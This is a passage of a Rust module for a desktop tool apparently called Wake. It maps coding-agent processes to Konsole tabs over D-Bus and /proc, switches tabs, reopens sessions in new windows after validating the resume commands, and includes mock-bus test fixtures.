//! Konsole on the desktop: which tab each agent runs in, jumping to it, reopening a session.
//!
//! Reading Konsole is done over D-Bus with `qdbus-qt6` (read-only calls only: sessionList,
//! currentSession, defaultProfile, processId, foregroundProcessId, title). The two actions, `jump`
//! and `reopen`, change the desktop, so both take `dry_run`, which returns the exact commands they
//! would run and runs nothing.
//!
//! Wayland lets no app raise another app's window. A jump selects the tab over D-Bus; bringing the
//! window forward is the desktop link's job (`look.rs`: Slipstream's Look request or a KWin script),
//! and where there is none Wake says where the tab is. Wake never sends a notification to navigate.
//!
//! Everything takes an injectable runner and a `/proc` root, so tests never touch the live desktop.

use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use crate::types::{ActionResult, Location};
use crate::util::{shell_join, shell_quote};

/// Qt 6's qdbus as Wake writes it in steps; the real runner runs [`qdbus_program`] for it.
pub const QDBUS: &str = "qdbus-qt6";
pub const GDBUS: &str = "gdbus";
pub const TIMEOUT: Duration = Duration::from_secs(2);
pub const CACHE_SECS: f64 = 2.0;
/// The whole Konsole scan gives up after this long (a hung Konsole must not stall Wake).
pub const SCAN_DEADLINE: Duration = Duration::from_secs(8);
const LINEAGE: usize = 64;
const ATTACH_DEPTH: usize = 4;
const ATTACH_PROCS: usize = 64;
const RESUME_PREFIXES: &[&str] = &["claude --resume ", "codex resume ", "claude attach "];
const FORBIDDEN: &[&str] = &["\n", "\r", ";", "&&", "|", "`", "$("];

/// Runs a program with no shell and no input: (exit code, stdout). 127 = not installed,
/// 124 = timed out, 126 = could not start.
pub type Runner = Arc<dyn Fn(&[String], Duration) -> (i32, String) + Send + Sync>;

/// Spawn, collect output, and give up (killing only that child) after `timeout`. A program that is
/// not installed is `ErrorKind::NotFound`, a timeout `ErrorKind::TimedOut` (never matched by text,
/// which depends on the locale).
pub fn run_with_timeout(mut cmd: Command, timeout: Duration) -> std::io::Result<(i32, String, String)> {
    cmd.stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped());
    let mut child = cmd.spawn()?;
    let mut out = child.stdout.take();
    let mut err = child.stderr.take();
    let t_out = std::thread::spawn(move || {
        let mut s = Vec::new();
        if let Some(o) = out.as_mut() {
            let _ = o.take(16 * 1024 * 1024).read_to_end(&mut s);
        }
        s
    });
    let t_err = std::thread::spawn(move || {
        let mut s = Vec::new();
        if let Some(e) = err.as_mut() {
            let _ = e.take(1024 * 1024).read_to_end(&mut s);
        }
        s
    });
    let start = Instant::now();
    let status = loop {
        match child.try_wait() {
            Ok(Some(st)) => break st,
            Ok(None) if start.elapsed() > timeout => {
                let _ = child.kill(); // our own helper child, never an agent
                let _ = child.wait();
                return Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "timed out"));
            }
            Ok(None) => std::thread::sleep(Duration::from_millis(5)),
            Err(e) => return Err(e),
        }
    };
    let o = String::from_utf8_lossy(&t_out.join().unwrap_or_default()).into_owned();
    let e = String::from_utf8_lossy(&t_err.join().unwrap_or_default()).into_owned();
    Ok((status.code().unwrap_or(1), o, e))
}

/// Qt 6's qdbus here: `qdbus-qt6` (Fedora, Arch), else `qdbus6` (Debian and Ubuntu name it so).
/// Never Qt 5's `qdbus`. Looked up on PATH once; `QDBUS` when neither is there.
pub fn qdbus_program() -> &'static str {
    static FOUND: std::sync::OnceLock<&'static str> = std::sync::OnceLock::new();
    FOUND.get_or_init(|| {
        let dirs: Vec<PathBuf> = std::env::var_os("PATH").map(|p| std::env::split_paths(&p).collect()).unwrap_or_default();
        [QDBUS, "qdbus6"].into_iter().find(|n| dirs.iter().any(|d| d.join(n).is_file())).unwrap_or(QDBUS)
    })
}

pub fn default_runner() -> Runner {
    Arc::new(|argv: &[String], timeout: Duration| {
        let Some((prog, args)) = argv.split_first() else { return (126, String::new()) };
        let prog = if prog == QDBUS { qdbus_program() } else { prog.as_str() };
        let mut cmd = Command::new(prog);
        cmd.args(args);
        match run_with_timeout(cmd, timeout) {
            Ok((code, out, _)) => (code, out),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => (127, String::new()),
            Err(e) if e.kind() == std::io::ErrorKind::TimedOut => (124, String::new()),
            Err(_) => (126, String::new()),
        }
    })
}

/// None when `command` is a resume command safe to type into a terminal, else why not.
pub fn check_command(command: Option<&str>) -> Option<String> {
    let Some(command) = command.filter(|c| !c.trim().is_empty()) else {
        return Some("There is no resume command for this session.".into());
    };
    for bad in FORBIDDEN {
        if command.contains(bad) {
            let shown = if *bad == "\n" || *bad == "\r" { "a line break".to_string() } else { format!("'{bad}'") };
            return Some(format!("Refused to type this command because it contains {shown}."));
        }
    }
    let Some(prefix) = RESUME_PREFIXES.iter().find(|p| command.starts_with(*p)) else {
        return Some("Refused to type this command: it must start with 'claude --resume ', 'claude attach ' or 'codex resume '.".into());
    };
    let rest = &command[prefix.len()..];
    let plain = rest.chars().all(|c| c.is_ascii_alphanumeric() || "._:=@/+ -".contains(c));
    if rest.trim().is_empty() || !plain {
        return Some("Refused to type this command: only a session id and plain options may follow.".into());
    }
    None
}

/// The parent pid from a /proc/<pid>/stat line, counting fields after the last ')'.
pub fn parent_of(stat: &str) -> Option<u32> {
    let end = stat.rfind(')')?;
    stat[end + 1..].split_whitespace().nth(1)?.parse().ok()
}

/// The nearest folder at or above `path` holding `.git`, with `.claude/worktrees/<name>` folded
/// back to its repo. Only looks. Falls back to `path` itself.
pub fn project_root(path: &str) -> String {
    let mut path = crate::store::lexical(Path::new(path)).to_string_lossy().into_owned();
    let marker = "/.claude/worktrees/";
    if let Some(i) = format!("{path}/").find(marker) {
        path = if i == 0 { "/".into() } else { path[..i].to_string() };
    }
    let mut probe = PathBuf::from(&path);
    loop {
        if probe.join(".git").exists() {
            return probe.to_string_lossy().into_owned();
        }
        if !probe.pop() {
            return path;
        }
    }
}

fn is_service(s: &str) -> Option<u32> {
    s.strip_prefix("org.kde.konsole-").and_then(|n| n.parse().ok())
}

/// One Konsole tab.
#[derive(Debug, Clone, PartialEq)]
pub struct Tab {
    pub konsole_pid: u32,
    pub service: String,
    pub window: u32,
    pub session: u32,
    pub tab_index: u32,
    pub tab_title: String,
    pub shell_pid: Option<u32>,
    pub foreground_pid: Option<u32>,
    /// How to name this tab to a person, unique on the desktop: "Konsole · tab 2" with one window,
    /// "Konsole 2 · tab 1" with several. Every Konsole process numbers its own windows from 1, so
    /// `window` alone is not unique: two Konsoles each have a "window 1, tab 1".
    pub label: String,
}

impl Tab {
    pub fn location(&self) -> Location {
        Location {
            konsole_pid: self.konsole_pid,
            service: self.service.clone(),
            window: self.window,
            session: self.session,
            tab_index: self.tab_index,
            tab_title: self.tab_title.clone(),
            label: Some(self.label.clone()),
        }
    }
}

/// Number windows across every Konsole on the desktop (in the order the map lists them: by Konsole
/// process, then window) and name each tab by that.
pub fn label_tabs(tabs: &mut [Tab]) {
    let mut windows: Vec<(u32, u32)> = Vec::new();
    for t in tabs.iter() {
        if !windows.contains(&(t.konsole_pid, t.window)) {
            windows.push((t.konsole_pid, t.window));
        }
    }
    let several = windows.len() > 1;
    for t in tabs.iter_mut() {
        let n = windows.iter().position(|w| *w == (t.konsole_pid, t.window)).unwrap_or(0) + 1;
        t.label = if several { format!("Konsole {n} · tab {}", t.tab_index + 1) } else { format!("Konsole · tab {}", t.tab_index + 1) };
    }
}

/// An agent process to place in a tab.
#[derive(Debug, Clone, PartialEq)]
pub struct Placee {
    pub pid: u32,
    /// Who the tab is credited to: the session pid for an attach client whose session is known,
    /// else `pid` itself.
    pub owner: u32,
}

/// Konsole tabs as last read, or why they could not be.
type TabCache = Option<(Instant, Result<Vec<Tab>, String>)>;

pub struct Desktop {
    run: Runner,
    proc: PathBuf,
    /// Path to systemd-run (or empty). Unused since navigation stopped sending notifications; kept
    /// so the configuration keeps its shape.
    #[allow(dead_code)]
    systemd_run: String,
    problem: Mutex<Option<String>>,
    /// Held only to read or swap the cached map, never while asking Konsole anything.
    cache: Mutex<TabCache>,
    /// One scan at a time; callers that find a scan running use the last map instead of waiting.
    scanning: Mutex<()>,
    /// A Konsole session's shell never changes, so its pid is asked once: (service, session) -> pid.
    shells: Mutex<std::collections::HashMap<(String, u32), u32>>,
}

pub(crate) fn which(name: &str) -> Option<String> {
    let path = std::env::var_os("PATH")?;
    std::env::split_paths(&path).map(|d| d.join(name)).find(|p| p.is_file()).map(|p| p.to_string_lossy().into_owned())
}

impl Desktop {
    pub fn new(run: Runner, proc: &Path, systemd_run: Option<&str>) -> Desktop {
        Desktop {
            run,
            proc: proc.to_path_buf(),
            systemd_run: match systemd_run {
                Some(s) => s.into(),
                None => which("systemd-run").unwrap_or_default(),
            },
            problem: Mutex::new(None),
            cache: Mutex::new(None),
            scanning: Mutex::new(()),
            shells: Mutex::new(std::collections::HashMap::new()),
        }
    }

    pub fn real() -> Desktop {
        Desktop::new(default_runner(), Path::new("/proc"), None)
    }

    /// A plain sentence when Konsole can't be read, else None.
    pub fn problem(&self) -> Option<String> {
        self.problem.lock().unwrap_or_else(|e| e.into_inner()).clone()
    }

    fn set_problem(&self, p: Option<&str>) {
        *self.problem.lock().unwrap_or_else(|e| e.into_inner()) = p.map(String::from);
    }

    /// A qdbus call that gives up at `deadline` (exit 124 once it has passed).
    fn q_by(&self, args: &[&str], deadline: Option<Instant>) -> (i32, String) {
        let timeout = match deadline {
            Some(d) => match d.checked_duration_since(Instant::now()) {
                Some(left) if !left.is_zero() => left.min(TIMEOUT),
                _ => return (124, String::new()),
            },
            None => TIMEOUT,
        };
        let mut argv = vec![QDBUS.to_string()];
        argv.extend(args.iter().map(|s| s.to_string()));
        (self.run)(&argv, timeout)
    }

    fn int(r: (i32, String)) -> Option<u32> {
        if r.0 == 0 { r.1.trim().parse().ok() } else { None }
    }

    /// Every Konsole tab. Cached for 2 s. Empty, with `problem()` set, when Konsole can't be read.
    pub fn konsole_map(&self, fresh: bool) -> Vec<Tab> {
        self.tabs(fresh).unwrap_or_default()
    }

    /// Every Konsole tab (cached for 2 s), or why Konsole could not be read. No tabs at all because
    /// Konsole is not running is `Ok(vec![])`: that is a sure answer, not a failure.
    ///
    /// The cache lock is never held while Konsole is asked: a scan runs outside it and swaps its
    /// result in. While one scan runs, other callers get the last map (if there is one) instead of
    /// queueing behind it; `fresh` callers wait for a scan that started after they asked.
    pub fn tabs(&self, fresh: bool) -> Result<Vec<Tab>, String> {
        let asked = Instant::now();
        let cached = |max_age: Option<f64>| -> Option<Result<Vec<Tab>, String>> {
            let c = self.cache.lock().unwrap_or_else(|e| e.into_inner());
            let (at, r) = c.as_ref()?;
            (max_age.is_none_or(|m| at.elapsed().as_secs_f64() < m)).then(|| r.clone())
        };
        if !fresh && let Some(r) = cached(Some(CACHE_SECS)) {
            return r;
        }
        let _scan = match self.scanning.try_lock() {
            Ok(g) => g,
            Err(_) => {
                if !fresh && let Some(r) = cached(None) {
                    return r;
                }
                self.scanning.lock().unwrap_or_else(|e| e.into_inner())
            }
        };
        // Someone else may have scanned while this caller waited for the lock.
        {
            let c = self.cache.lock().unwrap_or_else(|e| e.into_inner());
            if let Some((at, r)) = c.as_ref()
                && *at >= asked
            {
                return r.clone();
            }
        }
        let r = self.read_map(Instant::now() + SCAN_DEADLINE);
        self.set_problem(r.as_ref().err().map(String::as_str).or(if r.as_ref().is_ok_and(Vec::is_empty) { Some("Konsole is not running.") } else { None }));
        *self.cache.lock().unwrap_or_else(|e| e.into_inner()) = Some((Instant::now(), r.clone()));
        r
    }

    fn read_map(&self, deadline: Instant) -> Result<Vec<Tab>, String> {
        let slow = || "Konsole did not answer in time, so Wake cannot tell which tab each session is in right now.".to_string();
        let (code, out) = self.q_by(&[], Some(deadline));
        if code == 127 {
            return Err("The qdbus-qt6 tool is not installed, so Wake cannot see Konsole tabs. It comes with Qt 6's tools package.".into());
        }
        if code == 124 {
            return Err(slow());
        }
        if code != 0 {
            return Err("Could not reach the desktop's session bus, so Wake cannot see Konsole tabs.".into());
        }
        let mut services: Vec<(u32, String)> = out.lines().map(str::trim).filter_map(|l| is_service(l).map(|p| (p, l.to_string()))).collect();
        services.sort();
        let mut tabs = Vec::new();
        let late = |code: i32| code == 124 || Instant::now() >= deadline;
        for (konsole_pid, service) in services {
            let (code, out) = self.q_by(&[&service], Some(deadline));
            if late(code) {
                return Err(slow());
            }
            if code != 0 {
                continue; // that Konsole closed meanwhile
            }
            let mut windows: Vec<u32> = out.lines().filter_map(|l| l.trim().strip_prefix("/Windows/").and_then(|n| n.parse().ok())).collect();
            windows.sort();
            for window in windows {
                let wpath = format!("/Windows/{window}");
                let (code, out) = self.q_by(&[&service, &wpath, "sessionList"], Some(deadline));
                if late(code) {
                    return Err(slow());
                }
                if code != 0 {
                    continue;
                }
                let ids: Vec<u32> = out.split_whitespace().filter_map(|s| s.parse().ok()).collect();
                for (index, session) in ids.into_iter().enumerate() {
                    let path = format!("/Sessions/{session}");
                    let key = (service.clone(), session);
                    let known = self.shells.lock().unwrap_or_else(|e| e.into_inner()).get(&key).copied();
                    let shell = known.or_else(|| {
                        let p = Self::int(self.q_by(&[&service, &path, "processId"], Some(deadline)))?;
                        let mut m = self.shells.lock().unwrap_or_else(|e| e.into_inner());
                        if m.len() > 512 {
                            m.clear();
                        }
                        m.insert(key, p);
                        Some(p)
                    });
                    let fg_reply = self.q_by(&[&service, &path, "foregroundProcessId"], Some(deadline));
                    if late(fg_reply.0) {
                        return Err(slow());
                    }
                    let fg = Self::int(fg_reply);
                    let (code, title) = self.q_by(&[&service, &path, "title", "1"], Some(deadline));
                    if late(code) {
                        return Err(slow());
                    }
                    tabs.push(Tab {
                        konsole_pid,
                        service: service.clone(),
                        window,
                        session,
                        tab_index: index as u32,
                        tab_title: if code == 0 { title.trim().into() } else { String::new() },
                        shell_pid: shell,
                        foreground_pid: fg,
                        label: String::new(),
                    });
                }
            }
        }
        label_tabs(&mut tabs);
        Ok(tabs)
    }

    /// `pid`, its parent and so on up to (not including) init.
    pub fn lineage(&self, pid: u32) -> Vec<u32> {
        let mut chain = Vec::new();
        let mut next = Some(pid);
        while let Some(n) = next {
            if n <= 1 || chain.len() >= LINEAGE || chain.contains(&n) {
                break;
            }
            let Ok(stat) = std::fs::read_to_string(self.proc.join(n.to_string()).join("stat")) else { break };
            chain.push(n);
            next = parent_of(&stat);
        }
        chain
    }

    fn children(&self, pid: u32) -> Vec<u32> {
        let mut kids = Vec::new();
        let Ok(rd) = std::fs::read_dir(self.proc.join(pid.to_string()).join("task")) else { return kids };
        for t in rd.flatten().take(64) {
            if let Ok(s) = std::fs::read_to_string(t.path().join("children")) {
                kids.extend(s.split_whitespace().filter_map(|x| x.parse::<u32>().ok()));
            }
        }
        kids
    }

    fn cmdline(&self, pid: u32) -> Vec<String> {
        crate::procs::read_cmdline(&self.proc, pid)
    }

    /// Claude background jobs shown in a tab: the `<job>` of each `claude attach <job>` running in it.
    pub fn attached_jobs(&self, tab: &Tab) -> Vec<String> {
        let mut jobs = Vec::new();
        let mut frontier: Vec<u32> = [tab.foreground_pid, tab.shell_pid].into_iter().flatten().collect();
        let mut seen: Vec<u32> = Vec::new();
        for _ in 0..ATTACH_DEPTH {
            let mut next = Vec::new();
            for pid in frontier {
                if seen.contains(&pid) || seen.len() >= ATTACH_PROCS {
                    continue;
                }
                seen.push(pid);
                let argv = self.cmdline(pid);
                for i in 0..argv.len().saturating_sub(1) {
                    if argv[i] == "attach" && argv[..i].iter().any(|a| Path::new(a).file_name().is_some_and(|n| n.to_string_lossy().contains("claude"))) && !jobs.contains(&argv[i + 1]) {
                        jobs.push(argv[i + 1].clone());
                    }
                }
                next.extend(self.children(pid));
            }
            frontier = next;
        }
        jobs
    }

    /// The Konsole tab an agent process runs in: first by parentage, then (for a background
    /// session with a job id) a tab running `claude attach <jobId>`.
    pub fn locate(&self, pid: u32, job_id: Option<&str>) -> Option<Location> {
        let tabs = self.konsole_map(false);
        self.locate_in(&tabs, pid, job_id)
    }

    pub fn locate_in(&self, tabs: &[Tab], pid: u32, job_id: Option<&str>) -> Option<Location> {
        if tabs.is_empty() || pid == 0 {
            return None;
        }
        for ancestor in self.lineage(pid) {
            if let Some(t) = tabs.iter().find(|t| t.shell_pid == Some(ancestor)) {
                return Some(t.location());
            }
        }
        let job = job_id?;
        tabs.iter().find(|t| self.attached_jobs(t).iter().any(|j| j == job)).map(Tab::location)
    }

    fn is_agent_process(&self, pid: u32) -> bool {
        let exe = std::fs::read_link(self.proc.join(pid.to_string()).join("exe")).ok().map(|p| p.to_string_lossy().into_owned());
        crate::procs::agent_of(&self.cmdline(pid), exe.as_deref().map(|e| e.trim_end_matches(" (deleted)"))).is_some()
    }

    /// Which tab shows which agent: the one place Wake decides where a session is.
    ///
    /// A process claims the tab whose shell it descends from, unless another agent process sits in
    /// between: then it is that agent's helper (a `claude -p` a session ran, a daemon a session
    /// started, its sessions), and the tab shows the agent above it, not this one. A claim through
    /// the tab's foreground process (the agent itself, or `agent-notify` wrapping it, or a
    /// `claude attach` client) beats one that only reaches the shell, which is something running in
    /// the background of that shell. An attach client's claim is credited to its session (`owner`).
    ///
    /// Each tab goes to at most one owner and each owner gets at most one tab: best claim first
    /// (foreground, then nearest the shell, then lowest pid). Returns owner pid -> location.
    pub fn assign(&self, tabs: &[Tab], placees: &[Placee]) -> std::collections::HashMap<u32, Location> {
        let mut out = std::collections::HashMap::new();
        if tabs.is_empty() {
            return out;
        }
        // (rank, depth, owner, tab index)
        let mut claims: Vec<(u8, usize, u32, usize)> = Vec::new();
        for p in placees {
            let chain = self.lineage(p.pid);
            for (depth, anc) in chain.iter().enumerate() {
                if let Some(ti) = tabs.iter().position(|t| t.shell_pid == Some(*anc)) {
                    let fg = tabs[ti].foreground_pid;
                    let via_fg = fg.is_some_and(|f| chain[..=depth].contains(&f));
                    claims.push((if via_fg { 0 } else { 1 }, depth, p.owner, ti));
                    break;
                }
                if depth > 0 && self.is_agent_process(*anc) {
                    break; // a helper of another agent
                }
            }
        }
        claims.sort();
        let mut taken: Vec<usize> = Vec::new();
        for (_, _, owner, ti) in claims {
            if taken.contains(&ti) || out.contains_key(&owner) {
                continue;
            }
            taken.push(ti);
            out.insert(owner, tabs[ti].location());
        }
        out
    }

    fn live_tab(&self, loc: &Location) -> Option<Tab> {
        self.konsole_map(true).into_iter().find(|t| t.service == loc.service && t.window == loc.window && t.session == loc.session)
    }

    /// Select the agent's tab. (Bringing its window forward is the desktop link's job.)
    pub fn jump(&self, location: Option<&Location>, title: &str, dry_run: bool) -> ActionResult {
        let _ = title;
        let fail = |m: &str| ActionResult { ok: false, message: m.into(), steps: vec![] };
        let Some(loc) = location.filter(|l| is_service(&l.service).is_some()) else {
            return fail("Wake does not know which Konsole tab this session is in.");
        };
        let Some(tab) = self.live_tab(loc) else {
            return fail(&self.problem().unwrap_or_else(|| "That Konsole tab has closed.".into()));
        };
        let tab_title = if tab.tab_title.is_empty() { "untitled".to_string() } else { tab.tab_title.clone() };
        let select: Vec<String> = vec![QDBUS.into(), tab.service.clone(), format!("/Windows/{}", tab.window), "setCurrentSession".into(), tab.session.to_string()];
        let steps = vec![shell_join(&select)];
        let message = format!("Switched Konsole to the '{tab_title}' tab. It's in {}.", tab.label);
        if dry_run {
            return ActionResult { ok: true, message: format!("Dry run. {message}"), steps };
        }
        if (self.run)(&select, TIMEOUT).0 != 0 {
            return ActionResult { ok: false, message: format!("Konsole did not switch to the '{tab_title}' tab."), steps };
        }
        ActionResult { ok: true, message, steps }
    }

    /// Open a fresh Konsole window in `cwd` running the resume command (and a shell after it, so
    /// the window stays). On failure the message carries the command to copy.
    pub fn reopen(&self, cwd: Option<&str>, resume_command: &str, dry_run: bool) -> ActionResult {
        self.reopen_at(cwd, resume_command, dry_run).0
    }

    /// `reopen`. The second value was the Konsole to bring forward; a new window comes forward by
    /// itself, so it is always None now (kept for the callers).
    pub fn reopen_at(&self, cwd: Option<&str>, resume_command: &str, dry_run: bool) -> (ActionResult, Option<u32>) {
        if let Some(reason) = check_command(Some(resume_command)) {
            return (ActionResult { ok: false, message: reason, steps: vec![] }, None);
        }
        (self.new_window_running(cwd, resume_command, "resume", dry_run), None)
    }

    /// Start an agent with a brief: a fresh Konsole window in `cwd` running `command`, which must
    /// be the one `brief::command` makes for a file in `briefs` (checked again here).
    pub fn start_typed(&self, cwd: &str, command: &str, briefs: &Path, dry_run: bool) -> (ActionResult, Option<u32>) {
        if let Some(reason) = crate::brief::check_command(command, briefs) {
            return (ActionResult { ok: false, message: reason, steps: vec![] }, None);
        }
        (self.new_window_running(Some(cwd), command, "start the agent", dry_run), None)
    }

    /// A new Konsole window in `cwd` that runs `command` (already checked) in the person's shell,
    /// then leaves that shell open when it ends. Nothing is typed into an existing terminal: a new
    /// process is started, detached from Wake (setsid), so closing Wake leaves it running.
    fn new_window_running(&self, cwd: Option<&str>, command: &str, to: &str, dry_run: bool) -> ActionResult {
        let fail = |m: String, steps: Vec<String>| ActionResult { ok: false, message: m, steps };
        let cwd = match cwd.filter(|c| Path::new(c).is_absolute() && Path::new(c).is_dir()) {
            Some(c) => c,
            None => {
                return fail(format!("The folder {} is no longer there. Copy the command and run it where you want: {command}", cwd.unwrap_or("(unknown)")), vec![]);
            }
        };
        let copy = format!("cd {} && {command}", shell_quote(cwd));
        let argv = window_argv(cwd, command, &login_shell());
        let steps = vec![shell_join(&argv)];
        let message = format!("Opened a new Konsole window in {cwd} to {to}.");
        if dry_run {
            return ActionResult { ok: true, message: format!("Dry run. {message}"), steps };
        }
        let (code, out) = (self.run)(&argv, TIMEOUT);
        if code != 0 {
            let why = out.lines().last().unwrap_or("").trim().to_string();
            let why = if why.is_empty() { String::new() } else { format!(" ({why})") };
            return fail(format!("Konsole didn't open{why}. Copy this into a terminal to {to}: {copy}"), steps);
        }
        ActionResult { ok: true, message, steps }
    }
}

/// The shell new windows run: the session's $SHELL (what Konsole itself starts), else /bin/sh.
fn login_shell() -> String {
    std::env::var("SHELL").ok().filter(|s| s.starts_with('/') && Path::new(s).is_file()).unwrap_or_else(|| "/bin/sh".into())
}

/// `setsid -f konsole --workdir <cwd> -e /bin/sh -c '<command>; exec <shell> -i'`: a detached new
/// window that runs the command, then stays open on the person's interactive shell. The command
/// runs under a plain, non-interactive sh on purpose: an interactive shell reads its rc file, and
/// an rc file that hands over to another shell (`exec zsh` in .bashrc is common) would swallow the
/// command before it ran. Wake's own PATH (where `claude` is found) is inherited.
pub fn window_argv(cwd: &str, command: &str, shell: &str) -> Vec<String> {
    let script = format!("{command}; exec {} -i", shell_quote(shell));
    ["setsid", "-f", "konsole", "--workdir", cwd, "-e", "/bin/sh", "-c", &script].iter().map(|s| s.to_string()).collect()
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use std::collections::HashMap;
    use std::fs;

    /// konsole pid -> window -> [(session, shell pid, foreground pid, title)]
    pub type Konsoles = HashMap<u32, Vec<(u32, Vec<(u32, u32, u32, &'static str)>)>>;

    /// Answers qdbus-qt6 reads from a table; records every call. Writes are recorded, never run.
    #[derive(Clone, Default)]
    pub struct FakeBus {
        pub konsoles: Arc<Konsoles>,
        pub missing: bool,
        pub bus_down: bool,
        pub calls: Arc<Mutex<Vec<Vec<String>>>>,
        pub fail: Arc<Mutex<Vec<&'static str>>>,
    }

    impl FakeBus {
        pub fn new(k: Konsoles) -> FakeBus {
            FakeBus { konsoles: Arc::new(k), ..Default::default() }
        }

        pub fn runner(&self) -> Runner {
            let me = self.clone();
            Arc::new(move |argv: &[String], _t: Duration| me.call(argv))
        }

        fn failing(&self, what: &str) -> bool {
            self.fail.lock().unwrap().contains(&what)
        }

        fn call(&self, argv: &[String]) -> (i32, String) {
            self.calls.lock().unwrap().push(argv.to_vec());
            if self.missing {
                return (127, String::new());
            }
            if self.failing("timeout") && argv.iter().any(|a| a == "foregroundProcessId") {
                return (124, String::new());
            }
            if argv.iter().any(|a| a == "gdbus") {
                return if self.failing("notify") { (1, String::new()) } else { (0, "(uint32 7,)\n".into()) };
            }
            if argv[0] == "setsid" {
                return if self.failing("window") { (1, "konsole: could not connect to display".into()) } else { (0, String::new()) };
            }
            assert_eq!(argv[0], QDBUS);
            let args = &argv[1..];
            if args.is_empty() {
                if self.bus_down {
                    return (1, String::new());
                }
                let mut names = vec![" org.freedesktop.Notifications".to_string()];
                let mut pids: Vec<&u32> = self.konsoles.keys().collect();
                pids.sort();
                names.extend(pids.iter().map(|p| format!(" org.kde.konsole-{p}")));
                return (0, names.join("\n") + "\n");
            }
            let pid: u32 = args[0].rsplit('-').next().unwrap().parse().unwrap();
            let Some(windows) = self.konsoles.get(&pid) else { return (1, String::new()) };
            if args.len() == 1 {
                let mut paths = vec!["/".to_string(), "/Sessions".into(), "/Windows".into()];
                for (w, tabs) in windows {
                    paths.push(format!("/Windows/{w}"));
                    paths.extend(tabs.iter().map(|t| format!("/Sessions/{}", t.0)));
                }
                paths.push("/konsole/MainWindow_1".into());
                return (0, paths.join("\n") + "\n");
            }
            let (path, method) = (args[1].as_str(), args[2].as_str());
            if let Some(w) = path.strip_prefix("/Windows/") {
                let w: u32 = w.parse().unwrap();
                let tabs = &windows.iter().find(|(x, _)| *x == w).unwrap().1;
                return match method {
                    "sessionList" => (0, tabs.iter().map(|t| format!("{}\n", t.0)).collect()),
                    "defaultProfile" => (0, "Slipstream\n".into()),
                    "setCurrentSession" => (if self.failing("select") { 1 } else { 0 }, String::new()),
                    "newSession" => (0, if self.failing("new") { String::new() } else { "42\n".into() }),
                    _ => (1, String::new()),
                };
            }
            if let Some(sid) = path.strip_prefix("/Sessions/") {
                if method == "sendText" {
                    return (if self.failing("send") { 1 } else { 0 }, String::new());
                }
                let sid: u32 = sid.parse().unwrap_or(0);
                if sid == 42 && method == "processId" {
                    // The tab newSession made: with "slow", not answering for its first three asks,
                    // as Konsole does while it sets the tab up.
                    let asked = self.calls.lock().unwrap().iter().filter(|c| c.iter().any(|a| a == "/Sessions/42") && c.iter().any(|a| a == "processId")).count();
                    return if self.failing("slow") && asked <= 3 { (1, String::new()) } else { (0, "9999\n".into()) };
                }
                for (_, tabs) in windows {
                    for (s, shell, fg, title) in tabs {
                        if *s == sid {
                            return match method {
                                "processId" => (0, format!("{shell}\n")),
                                "foregroundProcessId" => (0, format!("{fg}\n")),
                                "title" => (0, format!("{title}\n")),
                                _ => (1, String::new()),
                            };
                        }
                    }
                }
            }
            (1, String::new())
        }

        pub fn writes(&self) -> Vec<Vec<String>> {
            self.calls
                .lock()
                .unwrap()
                .iter()
                .filter(|c| {
                    // Asking who is on the bus (NameHasOwner) is a read, not a write.
                    c.iter().any(|a| a == "setCurrentSession" || a == "newSession" || a == "sendText" || a == "gdbus" || a == "setsid") && !c.iter().any(|a| a == "org.freedesktop.DBus.NameHasOwner")
                })
                .cloned()
                .collect()
        }
    }

    pub fn konsoles() -> Konsoles {
        let mut k = Konsoles::new();
        k.insert(3262, vec![(1, vec![(1, 3718, 3718, "sam : bash")])]);
        k.insert(3264, vec![(1, vec![(1, 3702, 9001, "Projects : claude"), (4, 3800, 3800, "invites")])]);
        k
    }

    pub struct TmpDir(pub PathBuf);
    impl TmpDir {
        pub fn new(tag: &str) -> TmpDir {
            static N: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
            let p = std::env::temp_dir().join(format!("wake-rs-{tag}-{}-{}", std::process::id(), N.fetch_add(1, std::sync::atomic::Ordering::SeqCst)));
            let _ = fs::remove_dir_all(&p);
            fs::create_dir_all(&p).unwrap();
            TmpDir(fs::canonicalize(p).unwrap())
        }
    }
    impl Drop for TmpDir {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.0);
        }
    }

    /// Write /proc/<pid>/stat files with the given parent pids, and cwd links.
    pub fn fake_proc(root: &Path, parents: &[(u32, u32)], cwds: &[(u32, &Path)]) {
        for (pid, ppid) in parents {
            let d = root.join(pid.to_string());
            fs::create_dir_all(&d).unwrap();
            fs::write(d.join("stat"), format!("{pid} (odd) name) S {ppid} 1 1 0 -1\n")).unwrap();
        }
        for (pid, target) in cwds {
            let d = root.join(pid.to_string());
            fs::create_dir_all(&d).unwrap();
            std::os::unix::fs::symlink(target, d.join("cwd")).unwrap();
        }
    }

    fn desk(bus: &FakeBus, proc: &Path, sd: &str) -> Desktop {
        Desktop::new(bus.runner(), proc, Some(sd))
    }

    #[test]
    fn maps_every_tab() {
        let bus = FakeBus::new(konsoles());
        let d = desk(&bus, Path::new("/nonexistent"), "");
        let tabs = d.konsole_map(false);
        assert_eq!(tabs.len(), 3);
        assert_eq!(
            tabs[0],
            Tab {
                konsole_pid: 3262,
                service: "org.kde.konsole-3262".into(),
                window: 1,
                session: 1,
                tab_index: 0,
                tab_title: "sam : bash".into(),
                shell_pid: Some(3718),
                foreground_pid: Some(3718),
                label: "Konsole 1 · tab 1".into(),
            }
        );
        assert_eq!((tabs[2].session, tabs[2].tab_index, tabs[2].tab_title.as_str()), (4, 1, "invites"));
        assert_eq!(d.problem(), None);
        assert!(bus.writes().is_empty());
    }

    #[test]
    fn caches() {
        let bus = FakeBus::new(konsoles());
        let d = desk(&bus, Path::new("/nonexistent"), "");
        d.konsole_map(false);
        let n = bus.calls.lock().unwrap().len();
        d.konsole_map(false);
        assert_eq!(bus.calls.lock().unwrap().len(), n);
        d.konsole_map(true);
        assert!(bus.calls.lock().unwrap().len() > n);
    }

    #[test]
    fn degrades() {
        let d = desk(&FakeBus { missing: true, ..Default::default() }, Path::new("/x"), "");
        assert!(d.konsole_map(false).is_empty());
        assert!(d.problem().unwrap().contains("qdbus-qt6"));
        let d = desk(&FakeBus { bus_down: true, ..Default::default() }, Path::new("/x"), "");
        assert!(d.konsole_map(false).is_empty());
